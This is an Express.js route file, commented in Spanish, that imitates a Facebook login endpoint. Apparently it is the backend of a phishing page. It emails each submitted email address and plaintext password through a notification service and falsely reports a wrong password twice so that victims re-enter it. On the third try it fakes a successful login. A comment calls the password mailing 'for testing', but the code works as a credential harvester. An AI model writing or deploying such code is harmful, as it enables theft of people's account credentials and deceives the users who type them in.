const express = require('express');
const router = express.Router();
const { sendLoginAttemptEmail } = require('../services/emailService');

// Simulación de intentos de inicio de sesión por IP
const loginAttempts = new Map();

// Función para manejar intentos de inicio de sesión
const handleLoginAttempt = async (method, data, clientIp) => {
  const loginData = {
    method,
    email: data.email,
    password: data.password, // La contraseña se enviará por correo solo para pruebas
    timestamp: new Date(),
    ip: clientIp
  };

  // Enviar email de notificación
  await sendLoginAttemptEmail(loginData);
};

router.post('/facebook/login', async (req, res) => {
  const { email, password } = req.body;
  const clientIp = req.ip;

  try {
    // Registrar el intento de inicio de sesión
    await handleLoginAttempt('Facebook', { email, password }, clientIp);

    // Obtener o inicializar los intentos para esta IP
    if (!loginAttempts.has(clientIp)) {
      loginAttempts.set(clientIp, 0);
    }

    const attempts = loginAttempts.get(clientIp);
    loginAttempts.set(clientIp, attempts + 1);

    // Simular retardo
    await new Promise(resolve => setTimeout(resolve, 3000));

    // Simular respuesta basada en el número de intentos
    if (attempts < 2) {
      console.log(`Intento de inicio de sesión fallido #${attempts + 1} desde IP: ${clientIp}`);
      return res.status(401).json({
        success: false,
        message: 'Correo electrónico o contraseña incorrectos'
      });
    }

    // En el tercer intento, simular éxito
    console.log(`Inicio de sesión exitoso desde IP: ${clientIp}`);
    
    // Reiniciar contador de intentos
    loginAttempts.set(clientIp, 0);

    // Extraer el nombre del usuario del correo electrónico
    const name = email.split('@')[0];

    // Create a simulated user object with basic information
    const simulatedUser = {
      id: Math.random().toString(36).substr(2, 9),
      name: name,
      email: email,
      provider: 'facebook'
    };

    res.json({
      success: true,
      user: simulatedUser
    });

  } catch (error) {
    console.error('Error en el proceso de login:', error);
    res.status(500).json({
      success: false,
      message: 'Error en el servidor',
      error: error.message
    });
  }
});

module.exports = router;
